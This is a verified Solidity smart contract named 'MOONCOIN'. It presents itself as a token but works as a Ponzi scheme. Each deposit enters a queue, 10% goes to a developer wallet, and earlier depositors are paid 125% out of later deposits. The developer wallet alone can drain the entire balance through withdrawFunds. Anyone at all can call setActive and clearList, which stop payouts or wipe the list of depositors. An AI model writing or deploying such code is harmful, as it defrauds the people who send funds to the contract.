/**
 *Submitted for verification at Arbiscan on 2023-05-18
*/

pragma solidity ^0.7.4;
// SPDX-License-Identifier: Unlicensed

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IBEP20 {
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Auth {
    address internal owner;
    mapping (address => bool) internal authorizations;
    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
    }
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER"); _;
    }
    modifier authorized() {
        require(isAuthorized(msg.sender), "!AUTHORIZED"); _;
    }
    function authorize(address adr) public onlyOwner {
        authorizations[adr] = true;
    }
    function unauthorize(address adr) public onlyOwner {
        authorizations[adr] = false;
    }
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }
    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }
    event OwnershipTransferred(address owner);
}

contract MOONCOIN {
    using SafeMath for uint256;
    string constant _name = "MOONCOIN";
	User[] public users;
	uint public currentlyPaying = 0;
	uint public totalUsers = 0;
	uint public totalWei = 0;
	uint public totalPayout = 0;
	bool public active = true;
	bool public payoutsActive = true;
    uint256 public minBNB = 0;
    uint256 public maxBNB = 1000000000000000000000000000000000000000000000000000000 * (10**18) / 10;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address public devWallet = 0xCd068c6E6185b4A283C02bDDB0A5e2E5D1227006;
	struct User {
		address payable addr;
		uint amount;
	}
	function withdrawFunds() external {
		require(msg.sender == devWallet, "Cannot call function unless owner");
		require(address(this).balance > 0, "This contract must have a balane above zero");
        (bool tmpSuccess,) = payable(devWallet).call{value: address(this).balance, gas: 30000}("");
        tmpSuccess = false;
	}
    function setMinMaxBNB(uint256 newMin, uint256 newMax) external {
		require(msg.sender == devWallet, "Cannot call function unless owner");
        minBNB = newMin;
        maxBNB = newMax;
    }
    function changeWallet(address newWallet) external {
		require(msg.sender == devWallet, "Cannot call function unless owner");
        devWallet = newWallet;
    }
	function setActive(bool game, bool pays) external {
        active = game;
        payoutsActive = pays;
    }
	function clearList() external {
        delete users;
    }
	receive() external payable{
        require(active);
        require(msg.value >= minBNB);
        require(msg.value <= maxBNB);
        if (msg.sender != devWallet){
            users.push(User(msg.sender, msg.value));
            totalUsers += 1;
            totalWei += msg.value;
            (bool tmpSuccess,) = payable(devWallet).call{value: msg.value.div(10), gas: 30000}("");
            tmpSuccess = false;
            if (payoutsActive && address(this).balance > users[currentlyPaying].amount.mul(5).div(4)) {
                uint sendAmount = users[currentlyPaying].amount.mul(5).div(4);
                (bool tmpSuccess2,) = payable(users[currentlyPaying].addr).call{value: sendAmount, gas: 30000}("");
                tmpSuccess2 = false;
                totalPayout += sendAmount;
                currentlyPaying += 1;
            }
        }
	}
}